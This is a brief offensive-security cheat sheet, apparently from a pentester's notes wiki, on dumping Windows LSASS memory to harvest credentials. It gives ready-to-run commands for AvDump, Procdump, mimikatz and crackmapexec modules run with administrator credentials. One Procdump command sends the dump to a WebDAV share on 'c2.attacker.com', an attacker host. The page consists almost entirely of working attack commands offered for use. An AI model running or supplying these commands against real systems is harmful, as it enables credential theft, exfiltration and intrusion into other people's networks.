---
title: LSASS Dump with 3rd-party tools
---

[[notes/windows/lsass-dump]] with various utilities.

With `AvDump.exe` signed by [Avast](https://www.avast.com/).

~~~ bat
tasklist.exe /fi "imagename eq lsass.exe"
.\AvDump.exe --exception_ptr 0 --thread_id 0 --dump_level 1 --min_interval 0 --pid 720 --dump_file %COMPUTERNAME%.log
~~~

With [Procdump](https://download.sysinternals.com/files/Procdump.zip) to remote WebDAV share ([source](https://twitter.com/theluemmel/status/1532236231282769920)).

~~~ bat
.\procdump.exe -accepteula -ma -64 lsass.exe \\c2.attacker.com@80\share\%COMPUTERNAME%.log
~~~

With [[notes/tools/mimikatz]].

~~~ bat
.\mimikatz.exe privilege::debug token::elevate sekurlsa::logonpasswords exit
~~~

Remotely from Linux with [[notes/tools/crackmapexec]].

~~~ bash
crackmapexec smb srv01.corp.com --local-auth -u administrator -p 'passw0rd' -M lsassy
crackmapexec smb srv01.corp.com --local-auth -u administrator -p 'passw0rd' -M nanodump
crackmapexec smb srv01.corp.com --local-auth -u administrator -p 'passw0rd' -M mimikatz
crackmapexec smb srv01.corp.com --local-auth -u administrator -p 'passw0rd' -M procdump
~~~

Other tools:

- `DumpProc.exe` from Check Point Endpoint Protection, resulting dump file couldn't be parsed by `mimikatz` or `pypykatz`
